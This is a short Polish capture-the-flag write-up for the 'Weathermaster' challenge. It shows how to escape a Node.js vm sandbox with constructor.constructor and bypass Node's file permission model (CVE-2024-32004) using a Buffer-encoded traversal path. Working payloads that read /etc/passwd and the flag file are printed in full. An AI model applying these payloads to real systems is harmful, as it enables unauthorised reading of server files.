# Weathermaster - pwn

### Vulnerability

1. Komenda `! [code] - Execute code` korzysta z Node'wy [VM](https://nodejs.org/api/vm.html), w którym można łatwo importować dodatkowe biblioteki.

### Task

Używając poprzedniej komendy, można zaimportować `fs` którym próbujemy odczytać `/etc/passwd`:

```
EnviroTrack WeatherMaster 3000 Station Control Shell
Runtime version: v20.5.0
>> ! this.constructor.constructor("console.log(process.mainModule.require('fs').readFileSync('/etc/passwd').toString())")()
Access to this API has been restricted
```

Node przy uruchamianiu jest startowany z parametrami: `--experimental-permission --allow-fs-read="/app/*"`, używając [CVE-2024-32004](https://web.archive.org/web/20240229154138/https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/androcat#node-permissions-bypass) odczytujemy flagę (`/app/logs/../../flag.txt`):

```
>> ! this.constructor.constructor("console.log(process.mainModule.require('fs').readFileSync(new Buffer([47,97,112,112,47,108,111,103,115,47,46,46,47,46,46,47,102,108,97,103,46,116,120,116])).toString())")()

ecsc24{whats_th3_f0recast_f0r_nodejs?}
```
